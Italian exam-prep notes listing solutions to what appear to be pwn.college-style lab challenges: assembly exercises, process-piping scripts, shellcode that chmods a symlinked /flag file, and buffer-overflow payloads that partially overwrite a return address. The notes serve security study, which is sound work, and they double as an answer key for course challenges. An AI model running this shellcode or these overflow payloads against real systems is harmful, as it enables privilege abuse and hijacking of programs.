# Soluzioni da memorizzare

> [!Note]
>
> In generale per tutti gli esercizi di [**assembly**](##Assembly) e [**injection**](##inject) potrebbe essere necessario introdurre queste righe di codice
>
> ```python
> from pwn import *
> import subprocess
> 
> subprocess.run(["mkdir", "-p", "/tmp/pwntools-cache"])
> 
> context.arch = "x86-64" # o anche amd64, cambia poco
> context.cache_dir = "/tmp/pwntools-cache"
> ```
>
> ###### Questo potrebbe essere necessario per una questione di permessi con la cache di **pwntools**.

> [!TIp]
>
> Questa è la documentazione disponibile all’esame:
>
> - [**Documentazione dei registri assembly x86-64**](https://web.stanford.edu/class/cs107/resources/x86-64-reference.pdf)
> - [**Documentazione per le syscall di x86-64**](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
> - [**Altra documentazione su primitive assembly**](https://www.felixcloutier.com/x86/) (*Non sono sicuro ci sia all’esame*)
> - **Zeal** per la documentazione di python, C (usare `man`) e bash.

[TOC]



## Inject

Prima di tutto bisogna softlinkare la flag in ogni esercizio `ln -s /flag f`.

### es14

```assembly
    push rdx	# La prima parte del codice serve a performare la read
    pop rsi				 
    push rax
    pop rdi 
    syscall
.rept
    nop 
.endr
    push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90 
    pop rax
    syscall
```

### es13

```assembly
 	push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90 
    pop rax
    syscall
```

### es12

````assembly
    push 0x66
    pop rdi
    add eax, 90
    mov sil, 7
    syscall
````

### es11

```assembly
    push 0x66
    push rsp
    pop rdi
    push 7
    pop rsi
    push 90
    pop rax
    syscall
```

### es10

```assembly
    push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90
    pop rax
    syscall
```

### es9

```assembly
    push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    jmp con
.rept 11	# Il salto deve essere fatto precisamente per evitare ogni istruzione int3
    nop
.endr
con:
    push 90
    pop rax
    syscall
```

### es8

```assembly
    push 0x66
    push rsp
    pop rdi
    push 7
    pop rsi
    push 90
    pop rax
    syscall
```



## Assembly

### es10

```assembly
    mov rax, [0x404000]
    mov rbx, [0x404000]
    add rbx, 0x1337
    mov [0x404000], rbx
```

### es11

```assembly
    mov al, [0x404000]
    mov bx, [0x404000]
    mov ecx, [0x404000]
    mov rdx, [0x404000]
```

### es12

```assembly
    mov rax, 0xdeadbeef00001337
    mov rbx, 0xc0ffee0000
    mov [rdi], rax
    mov [rsi], rbx
```

### es13

```assembly
    mov rax, [rdi]
    mov rbx, [rdi+0x8]
    add rax, rbx
    mov [rsi], rax
```

### es14

```assembly
    pop rax
    sub rax, rdi
    push rax
```

### es15

```assembly
    push rdi
    push rsi
    pop rdi
    pop rsi
```

### es16

```assembly
    add rdx, [rsp+8]
    add rdx, [rsp+16]
    add rdx, [rsp+24]
    add rdx, [rsp]
    shr rdx, 2 
    push rdx
```

> ###### Viene richiesto di fare un avg dei primi 4 numeri nello stak senza usare `pop`, quindi si shifta il risultato della summa di due bit a deste per dividere per 4. 

### es17

```assembly
    jmp target
.rept 0x51
    nop
.endr
target:
    pop rdi
    mov rax, 0x403000
    jmp rax
```

### es18

```assembly
    mov eax, [rdi+4]
    mov ebx, [rdi+8]
    mov ecx, [rdi+12]
    mov rdx, 0x7f454c46
    cmp [rdi], edx
    je sum
    mov rdx, 0x00005A4D
    cmp [rdi], edx
    je sott
mult:
    imul ebx
    imul ecx
    jmp end
sum:
    add eax, ebx
    add eax, ecx
    jmp end
sott:
    sub eax, ebx
    sub eax, ecx
end:
```

### es19

```assembly
    cmp rdi, 3
    jle switch
    mov rax, [rsi+32]
    jmp rax		# caso base dello switch case
switch:
    imul rdi, 8
    add rsi, rdi
    jmp [rsi]
```

### es20

```assembly
    mov rbx, rsi
loop:
    add rax, [rdi]
    add rdi, 8
    sub rbx, 1
    cmp rbx, 0
    jne loop
    div rsi		# calcolo dell'avg
```

## Process

Gli esercizi 50, 51, 52 e 53 sono da svolgere con ipython e `run process.py`.

### es50

```python
import subprocess

p = subprocess.Popen("/challenge/embryoio_level50", stdin=subprocess.PIPE, text=True)
s = subprocess.Popen(["sed", ""], stdout=p.stdin, text=True)

p.communicate(s.stdout)
```

### es51

```python
import subprocess

p = subprocess.Popen("/challenge/embryoio_level52", stdin=subprocess.PIPE, text=True)
s = subprocess.Popen("rev", stdout=p.stdin, text=True)

p.communicate(s.stdout)
```

### es52

```python
import subprocess

p = subprocess.Popen("/challenge/embryoio_level52", stdin=subprocess.PIPE, text=True)
s = subprocess.Popen("cat", stdout=p.stdin, text=True)

p.communicate(s.stdout)
```

### es53

```python
import subprocess

p = subprocess.Popen("/challenge/embryoio_level53", stdin=subprocess.PIPE, text=True)
s = subprocess.Popen("rev", stdout=p.stdin, text=True)

p.communicate(s.stdout)
```

---

### es54

```python
import subprocess
subprocess.run("/challenge/embryoio_levelXX")
```



## Memory errors

### es8

```python
payload = b"154\n"
payload += b"\x00"*152 # dato il bug della scanf mettiamo tutti i byte 00 che passeranno il controllo sull'heap
payload += b"\xc6\x1a"
```

### es7

```python
payload = b"106\n"
payload += b"\x90"*104
payload += b"\xa2\x18"
```



